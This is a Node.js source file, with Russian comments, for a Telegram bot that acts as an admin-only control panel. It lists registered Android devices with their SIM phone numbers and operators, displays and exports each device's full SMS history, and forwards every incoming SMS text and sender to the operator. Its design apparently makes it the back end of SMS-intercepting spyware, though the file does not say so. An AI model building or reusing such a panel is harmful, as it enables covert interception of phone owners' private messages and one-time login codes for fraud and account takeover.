const { Markup } = require('telegraf');
const Device = require('../models/Device');
const SmsMessage = require('../models/SmsMessage');
const moment = require('moment');

// ID администратора из переменных окружения
const ADMIN_USER_ID = process.env.ADMIN_USER_ID;

// Объект для хранения состояния пользователя
const userStates = {};

// Настройка бота
const setupBot = (bot) => {
    // Команда /start для всех пользователей
    bot.start(async (ctx) => {
        const userId = ctx.from.id.toString();
        
        // Проверяем, является ли пользователь администратором
        if (userId === ADMIN_USER_ID) {
            await ctx.reply('Добро пожаловать в панель управления! Выберите действие:', getMainMenuKeyboard());
            userStates[userId] = { currentMenu: 'main' };
        } else {
            await ctx.reply('Извините, у вас нет доступа к этому боту.');
        }
    });

    // Обработка колбэков от инлайн-кнопок
    bot.on('callback_query', async (ctx) => {
        const userId = ctx.from.id.toString();
        
        // Проверяем, является ли пользователь администратором
        if (userId !== ADMIN_USER_ID) {
            await ctx.answerCbQuery('У вас нет доступа к этой функции');
            return;
        }

        const data = ctx.callbackQuery.data;
        
        try {
            // Удаляем уведомление о колбэке
            await ctx.answerCbQuery();
            
            if (data === 'devices') {
                // Список устройств
                await showDevicesList(ctx);
            } else if (data.startsWith('device:')) {
                // Детали устройства
                const deviceId = data.split(':')[1];
                await showDeviceDetails(ctx, deviceId);
            } else if (data.startsWith('sms:')) {
                // Список SMS для устройства
                const deviceId = data.split(':')[1];
                await showDeviceSms(ctx, deviceId);
            } else if (data.startsWith('export:')) {
                // Экспорт всех SMS для устройства
                const deviceId = data.split(':')[1];
                await exportAllSms(ctx, deviceId);
            } else if (data === 'back_to_devices') {
                // Возврат к списку устройств
                await showDevicesList(ctx);
            } else if (data === 'back_to_main') {
                // Возврат в главное меню
                await ctx.editMessageText('Выберите действие:', getMainMenuKeyboard());
                userStates[userId] = { currentMenu: 'main' };
            } else if (data.startsWith('delete_device:')) {
                // Удаление устройства
                const deviceId = data.split(':')[1];
                await deleteDevice(ctx, deviceId);
            }
        } catch (error) {
            console.error('Ошибка при обработке колбэка:', error);
            await ctx.reply('Произошла ошибка при выполнении операции.');
        }
    });
};

// Получение клавиатуры главного меню
const getMainMenuKeyboard = () => {
    return Markup.inlineKeyboard([
        [Markup.button.callback('📱 Список устройств', 'devices')]
    ]);
};

// Показать список устройств
const showDevicesList = async (ctx) => {
    try {
        const devices = await Device.find().sort({ lastActiveAt: -1 });
        
        if (devices.length === 0) {
            await ctx.editMessageText('Устройства не найдены.', Markup.inlineKeyboard([
                [Markup.button.callback('🏠 Главное меню', 'back_to_main')]
            ]));
            return;
        }
        
        let message = '📱 *Доступные устройства:*\n\n';
        const keyboard = [];
        
        for (const device of devices) {
            const lastActive = moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm');
            
            message += `*${device.deviceModel}*\n`;
            message += `🆔 ID: \`${device.deviceId}\`\n`;
            message += `📱 Android: ${device.androidVersion}\n`;
            message += `📅 Активность: ${lastActive}\n`;
            message += `📶 SIM-карты: ${device.simCards.length}\n\n`;
            
            keyboard.push([Markup.button.callback(`📱 ${device.deviceModel}`, `device:${device.deviceId}`)]);
        }
        
        keyboard.push([Markup.button.callback('🏠 Главное меню', 'back_to_main')]);
        
        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        });
    } catch (error) {
        console.error('Ошибка при получении списка устройств:', error);
        await ctx.reply('Произошла ошибка при получении списка устройств.');
    }
};

// Показать детали устройства
const showDeviceDetails = async (ctx, deviceId) => {
    try {
        const device = await Device.findOne({ deviceId });
        
        if (!device) {
            await ctx.editMessageText('Устройство не найдено.', Markup.inlineKeyboard([
                [Markup.button.callback('📱 Список устройств', 'devices')]
            ]));
            return;
        }
        
        // Получаем количество SMS для устройства
        const smsCount = await SmsMessage.countDocuments({ deviceId });
        
        let message = `📱 *Устройство: ${device.deviceModel}*\n\n`;
        message += `🆔 ID: \`${device.deviceId}\`\n`;
        message += `📱 Android: ${device.androidVersion}\n`;
        message += `📅 Зарегистрировано: ${moment(device.registeredAt).format('DD.MM.YYYY HH:mm')}\n`;
        message += `📅 Активность: ${moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm')}\n`;
        message += `✉️ SMS сообщений: ${smsCount}\n\n`;
        
        if (device.simCards && device.simCards.length > 0) {
            message += `📶 *SIM-карты:*\n`;
            for (const sim of device.simCards) {
                message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || 'Номер неизвестен'} (${sim.operatorName || 'Оператор неизвестен'})\n`;
            }
        } else {
            message += `📶 *SIM-карты:* Информация отсутствует\n`;
        }
        
        const keyboard = [
            [Markup.button.callback('✉️ Просмотр SMS', `sms:${deviceId}`)],
            [Markup.button.callback('📥 Экспорт всех SMS', `export:${deviceId}`)],
            [Markup.button.callback('❌ Удалить устройство', `delete_device:${deviceId}`)],
            [Markup.button.callback('📱 Список устройств', 'back_to_devices')],
            [Markup.button.callback('🏠 Главное меню', 'back_to_main')]
        ];
        
        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        });
    } catch (error) {
        console.error('Ошибка при получении информации об устройстве:', error);
        await ctx.reply('Произошла ошибка при получении информации об устройстве.');
    }
};

// Показать SMS для устройства
const showDeviceSms = async (ctx, deviceId) => {
    try {
        const device = await Device.findOne({ deviceId });
        
        if (!device) {
            await ctx.editMessageText('Устройство не найдено.', Markup.inlineKeyboard([
                [Markup.button.callback('📱 Список устройств', 'devices')]
            ]));
            return;
        }
        
        // Получаем последние 10 SMS для устройства
        const messages = await SmsMessage.find({ deviceId })
            .sort({ timestamp: -1 })
            .limit(10);
        
        let message = `✉️ *Последние SMS для ${device.deviceModel}:*\n\n`;
        
        if (messages.length === 0) {
            message += 'SMS сообщения отсутствуют.';
        } else {
            for (const sms of messages) {
                message += `📱 *От:* ${sms.sender}\n`;
                message += `💬 *Текст:* ${sms.text}\n`;
                message += `🕒 *Время:* ${moment(sms.timestamp).format('DD.MM.YYYY HH:mm')}\n`;
                message += `📶 *SIM:* SIM${sms.simSlot + 1}\n\n`;
            }
        }
        
        const keyboard = [
            [Markup.button.callback('📥 Экспорт всех SMS', `export:${deviceId}`)],
            [Markup.button.callback('📱 Информация об устройстве', `device:${deviceId}`)],
            [Markup.button.callback('📱 Список устройств', 'back_to_devices')],
            [Markup.button.callback('🏠 Главное меню', 'back_to_main')]
        ];
        
        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        });
    } catch (error) {
        console.error('Ошибка при получении SMS для устройства:', error);
        await ctx.reply('Произошла ошибка при получении SMS для устройства.');
    }
};

// Экспорт всех SMS для устройства
const exportAllSms = async (ctx, deviceId) => {
    try {
        const device = await Device.findOne({ deviceId });
        
        if (!device) {
            await ctx.editMessageText('Устройство не найдено.', Markup.inlineKeyboard([
                [Markup.button.callback('📱 Список устройств', 'devices')]
            ]));
            return;
        }
        
        // Получаем все SMS для устройства
        const messages = await SmsMessage.find({ deviceId }).sort({ timestamp: -1 });
        
        if (messages.length === 0) {
            await ctx.editMessageText('SMS сообщения отсутствуют.', Markup.inlineKeyboard([
                [Markup.button.callback('📱 Информация об устройстве', `device:${deviceId}`)]
            ]));
            return;
        }
        
        // Формируем текст для экспорта
        let exportText = `📱 *Экспорт SMS для ${device.deviceModel}*\n`;
        exportText += `📅 *Дата экспорта:* ${moment().format('DD.MM.YYYY HH:mm')}\n`;
        exportText += `📱 *Устройство:* ${device.deviceModel} (${device.androidVersion})\n`;
        exportText += `✉️ *Всего сообщений:* ${messages.length}\n\n`;
        exportText += `----------------------------------------------------------\n\n`;
        
        // Группируем сообщения по дням для удобства чтения
        const groupedMessages = {};
        for (const message of messages) {
            const date = moment(message.timestamp).format('DD.MM.YYYY');
            if (!groupedMessages[date]) {
                groupedMessages[date] = [];
            }
            groupedMessages[date].push(message);
        }
        
        // Формируем текст с группировкой по дням
        for (const date in groupedMessages) {
            exportText += `📅 *${date}*\n\n`;
            
            for (const message of groupedMessages[date]) {
                exportText += `🕒 ${moment(message.timestamp).format('HH:mm')}\n`;
                exportText += `📱 От: ${message.sender}\n`;
                exportText += `📶 SIM${message.simSlot + 1}\n`;
                exportText += `💬 ${message.text}\n\n`;
            }
            
            exportText += `----------------------------------------------------------\n\n`;
        }
        
        // Если экспорт очень большой, разбиваем на части
        const maxLength = 4000; // Telegram ограничивает сообщения примерно до 4096 символов
        if (exportText.length > maxLength) {
            let parts = [];
            for (let i = 0; i < exportText.length; i += maxLength) {
                parts.push(exportText.substring(i, i + maxLength));
            }
            
            for (let i = 0; i < parts.length; i++) {
                await ctx.reply(`Часть ${i + 1}/${parts.length}\n\n${parts[i]}`, {
                    parse_mode: 'Markdown'
                });
            }
            
            await ctx.reply('Экспорт завершен', Markup.inlineKeyboard([
                [Markup.button.callback('📱 Информация об устройстве', `device:${deviceId}`)],
                [Markup.button.callback('📱 Список устройств', 'back_to_devices')],
                [Markup.button.callback('🏠 Главное меню', 'back_to_main')]
            ]));
        } else {
            await ctx.reply(exportText, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📱 Информация об устройстве', `device:${deviceId}`)],
                    [Markup.button.callback('📱 Список устройств', 'back_to_devices')],
                    [Markup.button.callback('🏠 Главное меню', 'back_to_main')]
                ])
            });
        }
    } catch (error) {
        console.error('Ошибка при экспорте SMS:', error);
        await ctx.reply('Произошла ошибка при экспорте SMS.');
    }
};

// Удаление устройства
const deleteDevice = async (ctx, deviceId) => {
    try {
        // Удаляем устройство и все его SMS
        await Device.deleteOne({ deviceId });
        await SmsMessage.deleteMany({ deviceId });
        
        await ctx.editMessageText('✅ Устройство и все его SMS успешно удалены.', Markup.inlineKeyboard([
            [Markup.button.callback('📱 Список устройств', 'back_to_devices')],
            [Markup.button.callback('🏠 Главное меню', 'back_to_main')]
        ]));
    } catch (error) {
        console.error('Ошибка при удалении устройства:', error);
        await ctx.reply('Произошла ошибка при удалении устройства.');
    }
};

// Уведомление о новом устройстве
const notifyNewDevice = async (device) => {
    try {
        if (!global.bot) return;
        
        let message = `🔔 *Зарегистрировано новое устройство!*\n\n`;
        message += `📱 *Модель:* ${device.deviceModel}\n`;
        message += `🆔 *ID:* \`${device.deviceId}\`\n`;
        message += `📱 *Android:* ${device.androidVersion}\n`;
        
        if (device.simCards && device.simCards.length > 0) {
            message += `\n📶 *SIM-карты:*\n`;
            for (const sim of device.simCards) {
                message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || 'Номер неизвестен'} (${sim.operatorName || 'Оператор неизвестен'})\n`;
            }
        }
        
        await global.bot.telegram.sendMessage(ADMIN_USER_ID, message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('📱 Информация об устройстве', `device:${device.deviceId}`)]
            ])
        });
    } catch (error) {
        console.error('Ошибка при отправке уведомления о новом устройстве:', error);
    }
};

// Уведомление о новом SMS
const notifyNewSms = async (smsMessage, device) => {
    try {
        if (!global.bot) return;
        
        let message = `✉️ *Новое SMS сообщение!*\n\n`;
        message += `📱 *Устройство:* ${device.deviceModel}\n`;
        message += `🆔 *ID:* \`${device.deviceId}\`\n`;
        message += `📱 *От:* ${smsMessage.sender}\n`;
        message += `📶 *SIM:* SIM${smsMessage.simSlot + 1}\n`;
        message += `🕒 *Время:* ${moment(smsMessage.timestamp).format('DD.MM.YYYY HH:mm')}\n\n`;
        message += `💬 *Текст:*\n${smsMessage.text}`;
        
        await global.bot.telegram.sendMessage(ADMIN_USER_ID, message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('📱 Информация об устройстве', `device:${device.deviceId}`)]
            ])
        });
    } catch (error) {
        console.error('Ошибка при отправке уведомления о новом SMS:', error);
    }
};

// Уведомление о загрузке SMS
const notifyBulkSmsUpload = async (count, device) => {
    try {
        if (!global.bot) return;
        
        let message = `📥 *Загружены SMS сообщения!*\n\n`;
        message += `📱 *Устройство:* ${device.deviceModel}\n`;
        message += `🆔 *ID:* \`${device.deviceId}\`\n`;
        message += `✉️ *Количество:* ${count} сообщений\n`;
        
        await global.bot.telegram.sendMessage(ADMIN_USER_ID, message, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('📱 Информация об устройстве', `device:${device.deviceId}`)]
            ])
        });
    } catch (error) {
        console.error('Ошибка при отправке уведомления о загрузке SMS:', error);
    }
};

module.exports = {
    setupBot,
    notifyNewDevice,
    notifyNewSms,
    notifyBulkSmsUpload
}; 